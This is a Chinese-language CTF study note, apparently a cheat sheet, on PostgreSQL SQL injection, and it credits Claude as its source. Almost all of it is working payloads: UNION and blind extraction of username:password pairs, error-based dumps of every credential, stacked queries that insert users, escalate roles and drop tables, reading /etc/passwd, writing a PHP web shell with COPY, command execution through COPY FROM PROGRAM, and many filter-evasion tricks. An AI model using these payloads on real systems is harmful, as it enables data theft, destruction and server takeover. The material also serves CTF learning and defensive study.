打比赛遇到一道SQL注入的题目，用的不是MySql数据库，而是用的`postgresql`,这个数据库的语法和MySql有很大区别，所以学习一下。
为了学习，我让AI帮我写了一个靶场。
## 数据库类型的确定
数据库类型的确定一般要靠报错信息，如果报错信息出现类似`SQLSTATE 42601`和`unterminated quoted string`类似的报错，就基本可以确定是postgresql注入。
## 基础语法（易错点）
基础查询语句
```sql
SELECT id, name, price, stock FROM products WHERE visible=TRUE AND name ILIKE '%<用户输入>%'
```
- 用户输入会被包裹在`%%`里。这个`%`是没有必要闭合的，所以payload前既可以有`%`也可以不写
- 这里的`%`是`ILIKE`的通配符
- `||`拼接符，MySQL 里 `||` 是 OR，PostgreSQL 里是字符串拼接。
- **`$$dollar$$` 美元引号** — 单引号被过滤时的救星，`$$admin$$` 完全等价于 `'admin'`。
- **`pg_sleep()`** — 时间盲注专用，MySQL 用的是 `sleep()`，注意区别。
- **`STRING_AGG()`** — 一次性把多行聚合成一个字符串输出，在 UNION 注入和报错注入里都很好用，避免翻页。
- **`pg_read_file()` / `COPY FROM PROGRAM`** — PostgreSQL 特有的文件读写和命令执行，但都需要 superuser 权限，普通 web 用户一般触不到。
- 在联合查询时，每个列不一样，整数列只能放数字或NULL，字符串只能放在varchar/text列。 不确定就全用NULL，只在能放字符串的列位置填数据。这个是不可以混的，如果一个列的查询函数输出的是数字，那它就不可以放在`varchar/text列`，不然就会报错。如果就要放，那么就需要在后面加一个`::text`进行强制类型转换。或者也可以用`CAST`进行强制类型转换。例如`' UNION SELECT NULL, CAST(inet_server_addr() AS text), NULL, NULL--`
- 如果要同时查询多个列，就需要用到拼接，可以用`||`把两列拼接到一起输出。例如`' UNION SELECT NULL, column_name||' ('||data_type||')', NULL, NULL FROM information_schema.columns WHERE table_name='secret_flags'--`
- 在postgresql中字符串要用单引号包裹，双引号是标识符（表名、列名），不是字符串。
- `case when`语法，`case when <判断条件> then <真，返回> else <假，返回> end` 这个语法常用于盲注。
## 字符串操作
#### 字符串截取

| 语句                       | 作用                |
| ------------------------ | ----------------- |
| SUBSTRING('hello', 1, 1) | 'h'，从第1位取1个字符     |
| SUBSTR('hello', 2, 3)    | 'ell'，同 SUBSTRING |
| LEFT('hello', 3)         | 'hel'，取前 N 位      |
| RIGHT('hello', 2)        | 'lo'，取后 N 位       |
#### 字符转换
| 语句                                                  | 作用              |
| --------------------------------------------------- | --------------- |
| ASCII('A')                                          | 65，字符转 ASCII 码  |
| CHR(65)                                             |  'A'，ASCII 码转字符 |
| CHR(65)\|\|CHR(68)\|\|CHR(77)\|\|CHR(73)\|\|CHR(78) | 'ADMIN'，无引号拼字符串 |
#### 拼接与聚合
| 语句                                         | 作用               |
| ------------------------------------------ | ---------------- |
| 'hello' \|\| ' ' \|\| 'world'              | \|\| 是 PG 字符串拼接符 |
| CONCAT(username, ':', password)            | 函数式拼接            |
| STRING_AGG(username, ',') FROM users       | 聚合多行为一个字符串       |
| ARRAY_TO_STRING(ARRAY_AGG(username), '\|') | 先聚合为数组再转字符串      |
| LENGTH('hello')                            |  5，字符串长度         |
## 信息收集
#### 数据库基本信息
| 语句                                | 作用                            |
| --------------------------------- | ----------------------------- |
| select version()                  | 完整版本字符串                       |
| select current_database()         | 当前数据库名                        |
| select current_user               | 当前连接用户（current_user不是函数，不用括号） |
| select session_user               | 会话用户（也不用括号）                   |
| select inet_server_addr()         | 服务器IP地址                       |
| select pg_postmaster_start_time() | 数据库启动时间                       |
#### 枚举表结构
| 语句                                                                                     | 作用               |
| -------------------------------------------------------------------------------------- | ---------------- |
| SELECT table_name FROM information_schema.tables WHERE table_schema='public'           | 当前库的所有表          |
| SELECT tablename FROM pg_tables WHERE schemaname='public'                              | 列出表的另一种形式        |
| SELECT column_name, data_type FROM information_schema.columns WHERE table_name='users' | 从指定表中查列          |
| SELECT schemaname, tablename, tableowner FROM pg_tables                                | 列出数据库中所有表的基础归属信息 |
| SELECT datname FROM pg_database                                                        | 枚举所有数据库名         |
| SELECT usename, passwd FROM pg_shadow                                                  | 用户密码哈希（需要超级权限）   |
#### 权限探测
| 语句                                                      | 作用            |
| ------------------------------------------------------- | ------------- |
| SELECT usesuper FROM pg_user WHERE usename=current_user | 是否为超级用户       |
| SELECT has_table_privilege('users','SELECT')            | 是否有表查询权限      |
| SELECT current_setting('is_superuser')                  | on/off 判断超级权限 |

## UNiON查询
#### 步骤一：探列数
```sql
ORDER BY 1--  
ORDER BY 2--  
ORDER BY N--
```
 直到报错，报错时的 N-1 即为列数
 也可以
 ```sql
UNION SELECT NULL--  
UNION SELECT NULL,NULL--  
UNION SELECT NULL,NULL,NULL--
 ```
 NULL 不限类型，逐个增加直到不报错
#### 步骤二：找可输出列
```sql
UNION SELECT 'test',NULL,NULL,NULL--
UNION SELECT 12334,'test',NULL,NULL--
```
替换 NULL 为字符串，观察哪列出现在页面，这个也可以测试每一个列对应的类型，是字符串还是数字。注：在postgresql中字符串要用单引号包裹，双引号是标识符（表名、列名），不是字符串。
#### 步骤三：提取数据
```sql
UNION SELECT NULL,username,NULL,NULL FROM users--   //读取user表用户名
UNION SELECT NULL,username||':'||password,NULL,NULL FROM users--  //拼接多列到一列输出
UNION SELECT NULL,flag,NULL,NULL FROM secret_flags LIMIT 1 OFFSET 0--  //OFFSET 翻页读多行
UNION SELECT NULL,STRING_AGG(username,','),NULL,NULL FROM users--  //聚合一次输出所有行
UNION SELECT NULL,table_name,NULL,NULL FROM information_schema.tables WHERE table_schema='public'--  //联合枚举表名
```
## 布尔盲注
#### 基础判断
```sql
%' and 1=1--     //永真，结果与正常相同
```
就会列出数据库所有商品。
如果
```sql
%' and 1=2--    //永假，结果为空或不同
```
没有回显结果，就表明表达式不成立，不会输出任何内容。
#### CASE WHEN 条件模板
```sql
1 AND (SELECT CASE WHEN (条件) THEN 1 ELSE 0 END)=1  /*条件为真返回1，为假返回0*/
1 AND (SELECT CASE WHEN (SUBSTRING(password,1,1)='S') THEN 1 ELSE 0 END FROM users WHERE username='admin')=1  /*猜密码第1位是否为'S'，依据这个可以用爆破脚本*/
```
#### 逐字符提取（二分法）
```sql
SUBSTRING(str, pos, 1) /*截取第 pos 位单个字符*/
ASCII(SUBSTRING(password,1,1)) > 80  /*ASCII 值比较，配合二分加速*/
1 AND (SELECT CASE WHEN (ASCII(SUBSTRING(password,{N},1))>{MID}) THEN 1 ELSE 0 END FROM users WHERE username='admin')=1 /*二分模板：N=位置，MID=中间值*/
LENGTH(password) = 16 /*先盲注出字符串长度，再逐位猜*/
```
## 时间盲注
#### pg_sleep()基础
```sql
'; SELECT pg_sleep(3)--   //无条件延迟 3 秒验证注入点
' AND pg_sleep(3)-- //在 WHERE 条件后追加延迟
1; SELECT pg_sleep(3)-- //堆叠注入版本
```
#### 条件时间盲注
```sql
' AND (SELECT CASE WHEN (1=1) THEN pg_sleep(3) ELSE pg_sleep(0) END)--  
```
这个不会延时，因为pg_sleep()返回 void，不能用在 AND 里`pg_sleep()` 的返回类型是 `void`，而 `AND` 要求右边是 `boolean`，类型不兼容。
要修复可以把 void 转成布尔判断：
```sql
admin' AND (SELECT CASE WHEN (1=1) THEN pg_sleep(3) ELSE pg_sleep(0) END) IS NOT NULL--
```
`IS NOT NULL` 把 void 包了一层，返回 boolean，AND 可以接受，同时 pg_sleep 会正常执行。
也可以直接用堆叠查询
```sql
admin'; SELECT CASE WHEN (1=1) THEN pg_sleep(3) ELSE pg_sleep(0) END--
```
具体盲注模板
```sql
' AND (SELECT CASE WHEN (SUBSTRING(flag,1,1)='F') THEN pg_sleep(3) ELSE pg_sleep(0) END FROM secret_flags WHERE level='level3') is not null--
```
猜 flag 首字符是否为 F
```sql
' AND (SELECT CASE WHEN (ASCII(SUBSTRING(flag,{N},1))>{MID}) THEN pg_sleep(2) ELSE pg_sleep(0) END FROM secret_flags)--
```
时间盲注 + 二分 ASCII
## 报错注入
#### CAST 类型转换报错

```sql
CAST(值 AS 类型) 把一个值强制转换成另一种类型。
AND 1=CAST((SELECT version()) AS INTEGER) /*将字符串强转 int，报错带出内容*/
1 AND 1=CAST((SELECT username FROM users LIMIT 1 offset 0) AS INTEGER) /*读取第一个用户名*/
AND 1=CAST((SELECT username||':'||password FROM users LIMIT 1 OFFSET 0) AS INT)/*OFFSET 翻页读所有用户*/
```
聚合一次读多行
```sql
1 AND 1=CAST((SELECT STRING_AGG(username||':'||password, ' | ') FROM users) AS INT) /*一次报错带出所有用户密码*/
1 AND 1=CAST((SELECT STRING_AGG(flag,',') FROM secret_flags) AS INT) /*一次带出所有 flag*/
1 AND 1=CAST((SELECT ARRAY_AGG(username)::text FROM users) AS INT) /*ARRAY_AGG 转 text 再报错*/
```
`::oper`简写语法
```sql
1 and 1=(SELECT version())::integer /*等价于 CAST(... AS INTEGER)*/
```
其他写法
```sql
1 and 1=1/(SELECT CASE WHEN (1=2) THEN 0 ELSE 1 END) /*除零报错（条件为假时 /0）就会报错*/
```
## 堆叠查询
#### 基础堆叠
```sql
'; SELECT * FROM users-- //分号后执行第二条语句
'; SELECT pg_sleep(3)-- //堆叠+时间盲注
'; INSERT INTO users(username,password) VALUES('hacker','123')-- //插入新用户
```
#### DDL权限操作
```sql
'; UPDATE users SET role='admin' WHERE username='alice'--  //越权提升为 admin
'; CREATE TABLE shell(cmd text)-- //创建临时表作为中转
'; DROP TABLE products-- //删表（高危）
'; GRANT pg_execute_server_program TO current_user-- //尝试提权（需 superuser）
```
## COPY文件读写（需要超级权限）
```sql
'; COPY (SELECT '<?php system($_GET[cmd]); ?>') TO '/tmp/test.txt'-- //写入文件
'; SELECT pg_read_file('/etc/passwd')::text-- //读文件
'; CREATE TABLE t(v text); COPY t FROM '/etc/passwd'-- //读取服务器文件到表
```
## RCE操作（需要超级权限）
```sql
'; CREATE TABLE shell(output text)-- //建表，创建一个名为output的列，数据类型为text
'; COPY shell FROM PROGRAM 'id'-- //执行命令，输出存入表
'; SELECT * FROM shell-- //查表看结果
```
这样就可以RCE
## 绕过技巧
#### 空格绕过
块注释替代空格
```sql
'union/**/select/**/NULL,username,NULL,NULL/**/from/**/users--
```
这个方法几乎在所有数据库都通用。
括号消除部分空格需求
```sql
SELECT(name)FROM(users)
```
%09 Tab 键（URL编码）
```sql
SELECT%09name%09FROM%09users
```
%0a 换行符
```sql
SELECT%0aname%0aFROM%0ausers
```
%0d 回车符
```sql
SELECT%0dname%0dFROM%0dusers
```
%0c 换页符
```sql
SELECT%0cname%0cFROM%0cusers
```
#### 单引号绕过
美元符号，PG特有
```sql
'admin'  
$$admin$$ 
$x$admin$x$
'union select NULL,username,NULL,NULL from users where username=$x$admin$x$--
```
ASCII 拼接 → 'admin'
```sql
CHR(97)||CHR(100)||CHR(109)||CHR(105)||CHR(110)
'union select NULL,username,NULL,NULL from users where username=CHR(97)||CHR(100)||CHR(109)||CHR(105)||CHR(110)--
```
#### 注释符绕过
如果`--`被过滤了，可以使用字符拼接符绕过
```
' || <表达式> ||'
'1'='1
```

#### 关键字过滤
例如过滤字符关键字admin
可以用**十六进制**
```sql
E'\x61\x64\x6d\x69\x6e' 
'union select NULL,username,NULL,NULL from users where username=E'\x61\x64\x6d\x69\x6e'--
```
Unicode 转义字符串
```sql
U&'\0061\0064\006d\0069\006e'
'union select NULL,username,NULL,NULL from users where username=U&'\0061\0064\006d\0069\006e'--
```
如果过滤的是**语法关键字**
如果过滤的是`union select`
可以加ALL隔断
```sql
'union all select NULL,username,NULL,NULL from users --
```
如果过滤where，可以用 `HAVING` 配合 `GROUP BY` 来替代：
```sql
'union all select NULL,username,NULL,NULL from users where username='admin'--
可以写成
'union all select NULL,username,NULL,NULL from users group by username having username='admin'--
```
也可以用CASE WHEN绕过限制
```sql
';SELECT CASE WHEN username='admin' THEN password ELSE NULL END FROM users--
```
过滤and和or
在postgresql中`&&`和`||`都不管用了。
在比赛中，如果过滤and和or，一般就要考虑如何不用and和or，而不是如何替代它。
过滤cast
cast主要是用来转换数据类型的，一般来说就是要把内容转换成文本字符，有别的函数可以实现
- **`SUBSTR(string, start, len)`**: 返回 text。
- **`CHR(number)`**: 返回单个字符的 text。
- **`TO_JSON(variable)`**: 将任何东西转成 JSON 文本。
- `query_to_xml(sql, true, true, '')` 可以执行一条查询，并把结果转成 XML
- `database_to_xml(true, true, '')` 可以把当前数据库完整导出成 XML
- `xmlserialize(content ... as text)` 可以把 XML 安全转成文本
#### information_schema过滤
**查表名**
原写法
```sql
SELECT table_name FROM information_schema.tables WHERE table_schema='public'
```
`pg_class` 是PostgreSQL 的系统目录表，记录了数据库里**所有对象**的信息，包括普通表、视图、索引、序列等。
替代写法
```sql
SELECT relname FROM pg_class WHERE relkind='r' AND relnamespace=2200
```
`relnamespace=2200` 是 public schema 的固定 OID，大多数 PG 环境都一样。
**查列名**
原写法
```sql
SELECT column_name FROM information_schema.columns WHERE table_name='users'
```
替代写法
```sql
SELECT attname FROM pg_attribute a JOIN pg_class c ON a.attrelid=c.oid WHERE c.relname='users' AND attnum>0 AND attisdropped=false
```
`pg_attribute` 字段说明： 
- `attname` → 列名 
- `attnum` → 列序号，>0 排除系统列 
- `attisdropped` → 是否已删除，false 排除已删除的列
**绕过AND过滤**
结合上一段，查表名要用到AND，如果过滤and，该怎么绕过呢？
原写法
```sql
SELECT relname FROM pg_class WHERE relkind='r' AND relnamespace=2200
```
替代写法
```sql
-- AND 被过滤，用 CASE WHEN 嵌套替代
SELECT relname FROM pg_class 
WHERE (CASE WHEN (ASCII(relkind)=114) 
            THEN (CASE WHEN (relnamespace=2200) 
                       THEN 1 ELSE 0 END) 
            ELSE 0 END) = 1
```
这样通过嵌套`case when`就可以达到and的效果，因为它判断对错总是要先执行一下的。只有两个条件都满足时才返回1，完美替代 AND。

#### 绕过查Column
如果盲注Column太麻烦的话，可以绕过查`Column`，直接拿到整行数据。
用了 `ROW_TO_JSON`，**直接把整行数据一次性转成 JSON**，不需要先知道列名。
例如
```sql
SELECT ROW_TO_JSON((SELECT t FROM secrets t LIMIT 1))
```
输出例如
```sql
{"id":1,"flag":"FLAG{xxxx}","secret":"..."}
```
列名自动包含在 JSON 的 key 里，不需要提前知道列名，**读出来的 JSON 同时包含了列名和数据**。
#### 过滤`::`和CAST
因为`::`和CAST就是用来将数据转换成text格式。
可以用`ROW_TO_JSON`来隐式转换，`ROW_TO_JSON()` 返回的是 `json` 类型，不是 `text`，如果直接放到`length()`或`substr()`，里会直接报错
```sql
LENGTH(ROW_TO_JSON(...))
```
这种写法会报错需要改成
```sql
LENGTH(ROW_TO_JSON(...)::text) /*:: 被过滤*/  
LENGTH(CAST(ROW_TO_JSON(...) AS text)) /*CAST 被过滤*/
```
这样虽然不报错，但是被过滤了。
这时就要用到隐式类型转换。
```sql
LENGTH(ROW_TO_JSON((...)) || '')
```
`||` 是字符串拼接运算符，当 `json` 类型和空字符串 `''`（text 类型）拼接时，PostgreSQL 会**自动把 json 隐式转换成 text** 再拼接
拼接空字符串不改变内容，只是借助拼接触发了隐式类型转换，最终得到 text 类型。
还有另一种写法，用到`TEXTIN/JSON_OUT`
常规写法
```sql
ROW_TO_JSON(...)::text 
CAST(ROW_TO_JSON(...) AS text)
```
但是被过滤了。
替代写法
```sql
TEXTIN(JSON_OUT(ROW_TO_JSON(...)))
```
- `JSON_OUT()` 把 `json` 类型转成 cstring（C语言字符串）
- `TEXTIN()` 把 `cstring` 转成 text 类型
两个函数是 PostgreSQL 内部的**底层类型 I/O 函数**，正常用法是系统内部调用，但用户也可以直接调用



## 参考文章
本文全部参考Claude，网上找到的文章很少。
